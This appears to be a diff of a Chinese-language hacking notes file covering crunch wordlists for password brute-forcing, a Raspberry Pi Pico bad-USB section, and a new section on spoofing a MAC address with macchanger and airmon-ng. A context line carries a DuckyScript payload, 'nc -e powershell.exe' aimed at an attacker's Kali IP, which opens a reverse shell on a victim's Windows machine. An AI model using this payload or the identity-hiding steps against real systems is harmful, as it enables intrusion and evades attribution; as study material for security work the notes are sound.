@@ -176,7 +176,7 @@ crunch <min> <max> [options]	#min和max是生成的密码的最少、最长位�
 crunch 2 3 012345 -o ./aaa.txt
 ```
 
-# 5. 破解压缩包密码
+# 5. 爆破密码
 
 爆破法破解：纯数字密码不超过十位的话还有希望，带标点的基本就不用试了，要是再带字母。
 
@@ -464,8 +464,6 @@ https://blog.csdn.net/hktkfly6/article/details/123302335
 
 在官网ngrok.org无法注册。
 
-
-
 # 18. 树莓派pico制作bad usb
 
 获取Windows的powershell管理员权限。
@@ -503,7 +501,30 @@ STRING nc -e powershell.exe <kaliIP> 4444<port>
 ENTER
 ```
 
+# 19. MAC地址隐藏
 
+给网络设备（网络端口wlan0）修改临时MAC。
+
+```bash
+sudo apt-get install macchanger
+```
+
+```bash
+#停用wlan0端口
+airmon-ng stop wlan0
+ifconfig wlan0 down
+```
+
+```bash
+#macchanger随机生成MAC地址分配给网络端口
+macchanger -r wlan0		
+```
+
+```bash
+#重启端口
+ifconfig wlan0 up
+airmon-ng start wlan0
+```
 
 
 
